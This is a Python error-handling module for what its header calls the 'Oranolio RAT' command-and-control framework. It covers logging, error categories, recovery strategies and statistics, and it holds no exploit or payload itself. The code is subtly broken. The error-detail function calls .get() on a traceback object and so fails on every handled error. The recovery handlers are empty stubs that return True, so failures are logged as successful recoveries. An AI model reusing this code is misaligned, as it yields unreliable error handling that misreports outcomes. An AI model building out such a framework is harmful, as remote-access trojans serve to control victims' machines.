#!/usr/bin/env python3
"""
Centralized Error Handler for Oranolio RAT - Elite C2 Framework
Provides comprehensive error handling, logging, and recovery mechanisms
"""

import os
import sys
import json
import traceback
import logging
import threading
from datetime import datetime
from typing import Any, Dict, List, Optional, Callable, Union
from dataclasses import dataclass, asdict
from enum import Enum
import functools

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ErrorSeverity(Enum):
    """Error severity levels"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class ErrorCategory(Enum):
    """Error categories"""
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    VALIDATION = "validation"
    NETWORK = "network"
    DATABASE = "database"
    FILE_SYSTEM = "file_system"
    SECURITY = "security"
    SYSTEM = "system"
    APPLICATION = "application"
    EXTERNAL = "external"

@dataclass
class ErrorContext:
    """Context information for an error"""
    user_id: Optional[str] = None
    session_id: Optional[str] = None
    ip_address: Optional[str] = None
    user_agent: Optional[str] = None
    request_id: Optional[str] = None
    command: Optional[str] = None
    target_connection: Optional[str] = None
    additional_data: Dict[str, Any] = None

@dataclass
class ErrorInfo:
    """Information about an error"""
    error_id: str
    timestamp: datetime
    severity: ErrorSeverity
    category: ErrorCategory
    error_type: str
    message: str
    details: str
    context: ErrorContext
    stack_trace: str
    recovery_attempted: bool = False
    recovery_successful: bool = False
    resolved: bool = False

class ErrorRecoveryStrategy(Enum):
    """Error recovery strategies"""
    RETRY = "retry"
    FALLBACK = "fallback"
    GRACEFUL_DEGRADATION = "graceful_degradation"
    RESTART_SERVICE = "restart_service"
    MANUAL_INTERVENTION = "manual_intervention"
    IGNORE = "ignore"

class ErrorHandler:
    """Centralized error handling system"""
    
    def __init__(self, log_file: str = "logs/errors.log"):
        self.log_file = log_file
        self.error_count = 0
        self.recent_errors: List[ErrorInfo] = []
        self.max_recent_errors = 1000
        self.recovery_handlers: Dict[str, Callable] = {}
        self.error_handlers: Dict[str, Callable] = {}
        self.lock = threading.RLock()
        
        # Ensure log directory exists
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
        # Setup logging
        self._setup_logging()
        
        # Register default recovery handlers
        self._register_default_recovery_handlers()
    
    def _setup_logging(self):
        """Setup error logging"""
        # File handler for errors
        file_handler = logging.FileHandler(self.log_file)
        file_handler.setLevel(logging.ERROR)
        
        # Console handler for critical errors
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.CRITICAL)
        
        # Formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        
        # Add handlers to error logger
        error_logger = logging.getLogger('error_handler')
        error_logger.addHandler(file_handler)
        error_logger.addHandler(console_handler)
        error_logger.setLevel(logging.ERROR)
    
    def _register_default_recovery_handlers(self):
        """Register default error recovery handlers"""
        self.register_recovery_handler(
            ErrorCategory.NETWORK,
            self._recover_network_error
        )
        self.register_recovery_handler(
            ErrorCategory.DATABASE,
            self._recover_database_error
        )
        self.register_recovery_handler(
            ErrorCategory.AUTHENTICATION,
            self._recover_authentication_error
        )
    
    def register_recovery_handler(self, category: ErrorCategory, handler: Callable):
        """Register a recovery handler for a specific error category"""
        self.recovery_handlers[category.value] = handler
    
    def register_error_handler(self, error_type: str, handler: Callable):
        """Register a custom error handler for a specific error type"""
        self.error_handlers[error_type] = handler
    
    def handle_error(self, error: Exception, context: ErrorContext = None, 
                    severity: ErrorSeverity = ErrorSeverity.MEDIUM,
                    category: ErrorCategory = ErrorCategory.APPLICATION,
                    recovery_strategy: ErrorRecoveryStrategy = ErrorRecoveryStrategy.RETRY) -> ErrorInfo:
        """Handle an error with full context and recovery"""
        
        with self.lock:
            self.error_count += 1
            
            # Create error info
            error_info = ErrorInfo(
                error_id=f"ERR_{self.error_count}_{int(datetime.now().timestamp())}",
                timestamp=datetime.now(),
                severity=severity,
                category=category,
                error_type=type(error).__name__,
                message=str(error),
                details=self._get_error_details(error),
                context=context or ErrorContext(),
                stack_trace=traceback.format_exc()
            )
            
            # Log the error
            self._log_error(error_info)
            
            # Add to recent errors
            self.recent_errors.append(error_info)
            if len(self.recent_errors) > self.max_recent_errors:
                self.recent_errors.pop(0)
            
            # Attempt recovery
            if recovery_strategy != ErrorRecoveryStrategy.IGNORE:
                error_info.recovery_attempted = True
                error_info.recovery_successful = self._attempt_recovery(error_info, recovery_strategy)
            
            # Call custom error handler if registered
            if error_info.error_type in self.error_handlers:
                try:
                    self.error_handlers[error_info.error_type](error_info)
                except Exception as e:
                    logger.error(f"Error in custom error handler: {e}")
            
            return error_info
    
    def _get_error_details(self, error: Exception) -> str:
        """Get detailed information about an error"""
        details = {
            "error_type": type(error).__name__,
            "error_message": str(error),
            "module": getattr(error, '__module__', 'unknown'),
            "filename": getattr(error, '__traceback__', {}).get('tb_frame', {}).get('f_code', {}).get('co_filename', 'unknown'),
            "line_number": getattr(error, '__traceback__', {}).get('tb_lineno', 'unknown')
        }
        return json.dumps(details, indent=2)
    
    def _log_error(self, error_info: ErrorInfo):
        """Log error information"""
        error_logger = logging.getLogger('error_handler')
        
        log_data = {
            "error_id": error_info.error_id,
            "timestamp": error_info.timestamp.isoformat(),
            "severity": error_info.severity.value,
            "category": error_info.category.value,
            "error_type": error_info.error_type,
            "message": error_info.message,
            "context": asdict(error_info.context),
            "recovery_attempted": error_info.recovery_attempted,
            "recovery_successful": error_info.recovery_successful
        }
        
        if error_info.severity == ErrorSeverity.CRITICAL:
            error_logger.critical(json.dumps(log_data))
        elif error_info.severity == ErrorSeverity.HIGH:
            error_logger.error(json.dumps(log_data))
        else:
            error_logger.warning(json.dumps(log_data))
    
    def _attempt_recovery(self, error_info: ErrorInfo, strategy: ErrorRecoveryStrategy) -> bool:
        """Attempt to recover from an error"""
        try:
            if error_info.category.value in self.recovery_handlers:
                recovery_handler = self.recovery_handlers[error_info.category.value]
                return recovery_handler(error_info, strategy)
            else:
                return self._default_recovery(error_info, strategy)
        except Exception as e:
            logger.error(f"Error in recovery attempt: {e}")
            return False
    
    def _default_recovery(self, error_info: ErrorInfo, strategy: ErrorRecoveryStrategy) -> bool:
        """Default recovery mechanism"""
        if strategy == ErrorRecoveryStrategy.RETRY:
            # Simple retry logic
            return True
        elif strategy == ErrorRecoveryStrategy.FALLBACK:
            # Use fallback functionality
            return True
        elif strategy == ErrorRecoveryStrategy.GRACEFUL_DEGRADATION:
            # Continue with reduced functionality
            return True
        else:
            return False
    
    def _recover_network_error(self, error_info: ErrorInfo, strategy: ErrorRecoveryStrategy) -> bool:
        """Recover from network errors"""
        if strategy == ErrorRecoveryStrategy.RETRY:
            # Wait and retry
            import time
            time.sleep(1)
            return True
        return False
    
    def _recover_database_error(self, error_info: ErrorInfo, strategy: ErrorRecoveryStrategy) -> bool:
        """Recover from database errors"""
        if strategy == ErrorRecoveryStrategy.RETRY:
            # Retry database connection
            return True
        elif strategy == ErrorRecoveryStrategy.FALLBACK:
            # Use cached data or alternative storage
            return True
        return False
    
    def _recover_authentication_error(self, error_info: ErrorInfo, strategy: ErrorRecoveryStrategy) -> bool:
        """Recover from authentication errors"""
        if strategy == ErrorRecoveryStrategy.RETRY:
            # Clear session and retry
            return True
        return False
    
    def get_error_statistics(self) -> Dict[str, Any]:
        """Get error statistics"""
        with self.lock:
            if not self.recent_errors:
                return {"total_errors": 0}
            
            # Count by severity
            severity_counts = {}
            for error in self.recent_errors:
                severity = error.severity.value
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
            
            # Count by category
            category_counts = {}
            for error in self.recent_errors:
                category = error.category.value
                category_counts[category] = category_counts.get(category, 0) + 1
            
            # Count by error type
            error_type_counts = {}
            for error in self.recent_errors:
                error_type = error.error_type
                error_type_counts[error_type] = error_type_counts.get(error_type, 0) + 1
            
            # Recovery statistics
            recovery_attempted = sum(1 for error in self.recent_errors if error.recovery_attempted)
            recovery_successful = sum(1 for error in self.recent_errors if error.recovery_successful)
            
            return {
                "total_errors": len(self.recent_errors),
                "severity_counts": severity_counts,
                "category_counts": category_counts,
                "error_type_counts": error_type_counts,
                "recovery_attempted": recovery_attempted,
                "recovery_successful": recovery_successful,
                "recovery_rate": (recovery_successful / recovery_attempted * 100) if recovery_attempted > 0 else 0
            }
    
    def get_recent_errors(self, limit: int = 50) -> List[Dict[str, Any]]:
        """Get recent errors"""
        with self.lock:
            recent = self.recent_errors[-limit:] if len(self.recent_errors) > limit else self.recent_errors
            return [asdict(error) for error in recent]
    
    def clear_old_errors(self, older_than_hours: int = 24):
        """Clear errors older than specified hours"""
        cutoff_time = datetime.now().timestamp() - (older_than_hours * 3600)
        
        with self.lock:
            self.recent_errors = [
                error for error in self.recent_errors
                if error.timestamp.timestamp() > cutoff_time
            ]

# Global error handler instance
error_handler = ErrorHandler()

def handle_error(error: Exception, context: ErrorContext = None, 
                severity: ErrorSeverity = ErrorSeverity.MEDIUM,
                category: ErrorCategory = ErrorCategory.APPLICATION,
                recovery_strategy: ErrorRecoveryStrategy = ErrorRecoveryStrategy.RETRY) -> ErrorInfo:
    """Convenience function to handle errors"""
    return error_handler.handle_error(error, context, severity, category, recovery_strategy)

def error_handler_decorator(severity: ErrorSeverity = ErrorSeverity.MEDIUM,
                          category: ErrorCategory = ErrorCategory.APPLICATION,
                          recovery_strategy: ErrorRecoveryStrategy = ErrorRecoveryStrategy.RETRY):
    """Decorator for automatic error handling"""
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                context = ErrorContext(
                    additional_data={
                        "function": func.__name__,
                        "args": str(args)[:200],  # Limit length
                        "kwargs": str(kwargs)[:200]
                    }
                )
                error_info = handle_error(e, context, severity, category, recovery_strategy)
                
                # Re-raise if recovery failed
                if not error_info.recovery_successful:
                    raise
                
                return None
        return wrapper
    return decorator

def log_security_event(event_type: str, details: Dict[str, Any], 
                      context: ErrorContext = None):
    """Log security-related events"""
    security_error = Exception(f"Security event: {event_type}")
    handle_error(
        security_error,
        context=context,
        severity=ErrorSeverity.HIGH,
        category=ErrorCategory.SECURITY,
        recovery_strategy=ErrorRecoveryStrategy.IGNORE
    )

def get_error_statistics() -> Dict[str, Any]:
    """Get error statistics"""
    return error_handler.get_error_statistics()

def get_recent_errors(limit: int = 50) -> List[Dict[str, Any]]:
    """Get recent errors"""
    return error_handler.get_recent_errors(limit)

# Example usage and testing
if __name__ == "__main__":
    # Test error handling
    print("Error Handler Test")
    print("=" * 30)
    
    # Test basic error handling
    try:
        raise ValueError("Test error")
    except Exception as e:
        context = ErrorContext(
            user_id="test_user",
            ip_address="127.0.0.1",
            command="test_command"
        )
        error_info = handle_error(e, context)
        print(f"Error handled: {error_info.error_id}")
    
    # Test error statistics
    stats = get_error_statistics()
    print(f"Total errors: {stats['total_errors']}")
    print(f"Severity counts: {stats['severity_counts']}")
    
    # Test decorator
    @error_handler_decorator()
    def test_function():
        raise RuntimeError("Test runtime error")
    
    try:
        test_function()
    except:
        print("Function executed with error handling")